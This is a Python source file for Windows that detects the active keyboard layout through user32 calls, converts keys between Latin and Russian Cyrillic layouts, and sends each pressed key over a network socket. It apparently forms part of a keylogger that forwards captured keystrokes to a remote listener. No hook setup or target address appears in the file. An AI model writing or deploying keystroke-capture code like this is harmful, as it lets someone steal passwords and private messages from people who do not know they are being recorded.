import ctypes
import time

language_codes = {
    '0x409': 'English - United States',
    '0x809': 'English - United Kingdom',
    '0x419': 'Russian',
}
latin_into_cyrillic = (
    "QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./" +
    "qwertyuiop[]asdfghjkl;'zxcvbnm,./" +
    "~`{[}]:;\"'|<,>.?/@#$$^&",

    "ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ." +
    "йцукенгшщзхъфывапролджэячсмитьбю." +
    "ЁёХхЪъЖжЭэ/БбЮю,.\"№;:?"
)
cyrillic_into_latin = (latin_into_cyrillic[1], latin_into_cyrillic[0])

latin_into_cyrillic_map = dict([(ord(a), ord(b))
                               for (a, b) in zip(*latin_into_cyrillic)])
cyrillic_into_latin_map = dict([(ord(a), ord(b))
                               for (a, b) in zip(*cyrillic_into_latin)])

cyrillic_layouts = ['Russian', 'Belarusian', 'Kazakh']


def detect_keyboard_layout():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2**16 - 1)
    lid_hex = hex(lid)
    return language_codes.get(lid_hex, 'English - United States')


current_layout = detect_keyboard_layout()


def layout_watcher(stop_flag):
    global current_layout
    while not stop_flag.is_set():
        current_layout = detect_keyboard_layout()
        time.sleep(0.5)


def translate_key(key_pressed, current_layout):
    code = ord(key_pressed)
    '''if current_layout in cyrillic_layouts and 'А' <= key_pressed <= 'я':
        return key_pressed
    if current_layout.startswith("English") and ('A' <= key_pressed <= 'z' or
    'A' <= key_pressed <= 'Z'):
        return key_pressed'''
    if current_layout in cyrillic_layouts:
        return chr(latin_into_cyrillic_map.get(code, code))
    if current_layout.startswith("English"):
        return chr(cyrillic_into_latin_map.get(code, code))
    return key_pressed


def send_key(sock, key):
    try:
        key_pressed = key.name
        if key_pressed is None or len(key_pressed) == 0:
            return
        if len(key_pressed) == 1:
            layout = current_layout
            key_pressed = translate_key(key_pressed, layout)
        elif key_pressed in ['space', 'enter', 'tab', 'backspace']:
            pass
        else:
            return
        sock.sendall(key_pressed.encode('utf-8'))
        time.sleep(0.01)
    except Exception as e:
        print(f"Send error: {e}")


if __name__ == "__main__":
    print(f"current layout is {detect_keyboard_layout()}")
